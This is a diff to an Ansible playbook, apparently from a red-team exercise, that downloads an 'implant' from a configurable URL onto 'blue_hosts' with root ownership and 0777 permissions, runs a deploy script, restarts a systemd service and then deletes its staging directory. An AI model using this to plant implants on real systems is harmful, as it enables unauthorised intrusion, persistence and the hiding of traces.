@@ -1,5 +1,5 @@
 ---
-# Deployment on the flask host - sitting behind the firewall
+# Deploy implant on remote hosts
 - name: Deploy implant
   hosts: blue_hosts
   vars:
@@ -11,7 +11,7 @@
     - name: download implant
       ansible.builtin.get_url:
         url: "{{ implant_url }}"
-        dest: "/usr/bin/msgbus"
+        dest: "/tmp/implant"
         mode: '0777'
         owner: root
       
@@ -28,7 +28,12 @@
     - name: Execute the deploy script
       command: sh /tmp/shelly/deploy/deploy.sh
 
-        # Starts the systemd service for msgbus
     - name: start systemd app service
       systemd: name=msgbus.service state=restarted enabled=yes
       become: yes
+
+    - name: Delete content & directory
+      ansible.builtin.file:
+        state: absent
+        path: /tmp/shelly
+
